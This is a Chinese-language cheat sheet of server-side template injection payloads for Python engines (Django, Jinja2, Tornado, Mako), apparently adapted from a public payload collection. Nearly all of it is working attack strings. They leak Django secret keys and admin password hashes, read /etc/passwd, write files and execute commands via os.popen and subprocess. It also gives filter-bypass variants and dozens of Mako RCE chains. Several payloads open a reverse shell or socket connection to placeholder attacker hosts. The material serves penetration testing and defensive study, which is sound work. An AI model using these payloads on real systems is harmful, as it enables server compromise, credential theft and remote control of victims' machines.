# 服务器端模板注入 (SSTI) - Python

> 服务器端模板注入(SSTI)是一种漏洞，当攻击者能够将恶意输入注入到服务器端模板中，导致在服务器上执行任意代码时出现。在Python中，当使用模板引擎（如Jinja2、Mako或Django模板）且用户输入未经过适当清理就包含在模板中时，可能会发生SSTI。

## 目录

- [模板库](#模板库)
- [Django](#django)
    - [Django - 基础注入](#django---基础注入)
    - [Django - 跨站脚本](#django---跨站脚本)
    - [Django - 调试信息泄露](#django---调试信息泄露)
    - [Django - 泄露应用密钥](#django---泄露应用密钥)
    - [Django - 管理员站点URL泄露](#django---管理员站点url泄露)
    - [Django - 管理员用户名和密码哈希泄露](#django---管理员用户名和密码哈希泄露)
- [Jinja2](#jinja2)
    - [Jinja2 - 基础注入](#jinja2---基础注入)
    - [Jinja2 - 模板格式](#jinja2---模板格式)
    - [Jinja2 - 调试语句](#jinja2---调试语句)
    - [Jinja2 - 转储所有使用的类](#jinja2---转储所有使用的类)
    - [Jinja2 - 转储所有配置变量](#jinja2---转储所有配置变量)
    - [Jinja2 - 读取远程文件](#jinja2---读取远程文件)
    - [Jinja2 - 写入远程文件](#jinja2---写入远程文件)
    - [Jinja2 - 远程命令执行](#jinja2---远程命令执行)
        - [强制盲注RCE输出](#jinja2---强制盲注rce输出)
        - [通过调用os.popen().read()利用SSTI](#通过调用ospopenread利用ssti)
        - [通过调用subprocess.Popen利用SSTI](#通过调用subprocesspopen利用ssti)
        - [无需猜测偏移量调用Popen利用SSTI](#无需猜测偏移量调用popen利用ssti)
        - [通过写入恶意配置文件利用SSTI](#通过写入恶意配置文件利用ssti)
    - [Jinja2 - 过滤器绕过](#jinja2---过滤器绕过)
- [Tornado](#tornado)
    - [Tornado - 基础注入](#tornado---基础注入)
    - [Tornado - 远程命令执行](#tornado---远程命令执行)
- [Mako](#mako)
    - [Mako - 远程命令执行](#mako---远程命令执行)
- [参考资料](#参考资料)

## 模板库

| 模板名称 | 载荷格式 |
| ------------ | --------- |
| Bottle    | `{{ }}`  |
| Chameleon | `${ }`   |
| Cheetah   | `${ }`   |
| Django    | `{{ }}`  |
| Jinja2    | `{{ }}`  |
| Mako      | `${ }`   |
| Pystache  | `{{ }}`  |
| Tornado   | `{{ }}`  |

## Django

Django模板语言默认支持2种渲染引擎：Django模板(DT)和Jinja2。Django模板是一个更简单的引擎。它不允许调用传递的对象函数，DT中的SSTI影响通常比Jinja2小。

### Django - 基础注入

```python
{% csrf_token %} # 在Jinja2中会导致错误
{{ 7*7 }}  # 在Django模板中会出错
ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
```

### Django - 跨站脚本

```python
{{ '<script>alert(3)</script>' }}
{{ '<script>alert(3)</script>' | safe }}
```

### Django - 调试信息泄露

```python
{% debug %}
```

### Django - 泄露应用密钥

```python
{{ messages.storages.0.signer.key }}
```

### Django - 管理员站点URL泄露

```python
{% include 'admin/base.html' %}
```

### Django - 管理员用户名和密码哈希泄露

```python
{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
{{e.user.get_username}} : {{e.user.password}}{% endfor %}

{% get_admin_log 10 as admin_log for_user user %}
```

---

## Jinja2

[官方网站](https://jinja.palletsprojects.com/)
> Jinja2是Python的一个功能丰富的模板引擎。它具有完整的Unicode支持，可选的集成沙箱执行环境，被广泛使用且采用BSD许可。

### Jinja2 - 基础注入

```python
{{4*4}}[[5*5]]
{{7*'7'}}  # 结果为7777777
{{config.items()}}
```

Jinja2被Python Web框架如Django或Flask使用。
上述注入已在Flask应用程序上测试过。

### Jinja2 - 模板格式

```python
{% extends "layout.html" %}
{% block body %}
  <ul>
  {% for user in users %}
    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
  {% endfor %}
  </ul>
{% endblock %}
```

### Jinja2 - 调试语句

如果启用了调试扩展，将可以使用`{% debug %}`标签来转储当前上下文以及可用的过滤器和测试。这对于查看模板中可用的内容而无需设置调试器非常有用。

```python
<pre>{% debug %}</pre>
```

来源: [jinja.palletsprojects.com](https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement)

### Jinja2 - 转储所有使用的类

```python
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
```

访问`__globals__`和`__builtins__`:

```python
{{ self.__init__.__globals__.__builtins__ }}
```

### Jinja2 - 转储所有配置变量

```python
{% for key, value in config.iteritems() %}
    <dt>{{ key|e }}</dt>
    <dd>{{ value|e }}</dd>
{% endfor %}
```

### Jinja2 - 读取远程文件

```python
# ''.__class__.__mro__[2].__subclasses__()[40] = 文件类
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Jinja2 - 写入远程文件

```python
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```

### Jinja2 - 远程命令执行

监听连接

```bash
nc -lnvp 8000
```

#### Jinja2 - 强制盲注RCE输出

您可以导入Flask函数以从易受攻击的页面返回输出。

```python
{{
x.__init__.__builtins__.exec("from flask import current_app, after_this_request
@after_this_request
def hook(*args, **kwargs):
    from flask import make_response
    r = make_response('Powned')
    return r
")
}}
```

#### 通过调用os.popen().read()利用SSTI

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

但是当`__builtins__`被过滤时，以下载荷是上下文无关的，除了在jinja2模板对象中外，不需要任何东西：

```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
```

我们可以使用这些来自[@podalirius_](https://twitter.com/podalirius_)的较短载荷：[python-vulnerabilities-code-execution-in-jinja-templates](https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/)：

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}
```

使用[objectwalker](https://github.com/p0dalirius/objectwalker)我们可以找到从`lipsum`到`os`模块的路径。这是在Jinja2模板中实现RCE的最短已知载荷：

```python
{{ lipsum.__globals__["os"].popen('id').read() }}
```

#### 通过调用subprocess.Popen利用SSTI

:warning: 数字396会根据应用程序而变化。

```python
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```

#### 无需猜测偏移量调用Popen利用SSTI

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

[@SecGus](https://twitter.com/SecGus/status/1198976764351066113)对载荷的简单修改，用于清理输出并方便命令输入。在另一个GET参数中包含一个名为"input"的变量，该变量包含您要运行的命令（例如：&input=ls）

```python
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
```

#### 通过写入恶意配置文件利用SSTI

```python
# 恶意配置
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# 加载恶意配置
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# 连接到恶意主机
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
```

### Jinja2 - 过滤器绕过

```python
request.__class__
request["__class__"]
```

绕过`_`

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

绕过`[`和`]`

```python
http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
或
http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
```

绕过`|join`

```python
http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
```

通过[@SecGus](https://twitter.com/SecGus)绕过大多数常见过滤器（'.','_','|join','[',']','mro'和'base'）：

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Tornado

### Tornado - 基础注入

```python
{{7*7}}
{{7*'7'}}
```

### Tornado - 远程命令执行

```python
{{os.system('whoami')}}
{%import os%}{{os.system('nslookup oastify.com')}}
```

---

## Mako

[官方网站](https://www.makotemplates.org/)
> Mako是一个用Python编写的模板库。从概念上讲，Mako是一种嵌入式Python（即Python服务器页面）语言，它完善了组件化布局和继承的熟悉概念，产生了最直接和灵活的模型之一，同时保持了与Python调用和作用域语义的紧密联系。

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

### Mako - 远程命令执行

以下任何载荷都允许直接访问`os`模块

```python
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.__init__.__globals__['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.__init__.__globals__['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

PoC :

```python
>>> print(Template("${self.module.cache.util.os}").render())
<module 'os' from '/usr/local/lib/python3.10/os.py'>
```

## 参考资料

* [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
* [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
* [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
* [Server-Side Template Injection - PortSwigger](https://portswigger.net/research/server-side-template-injection)
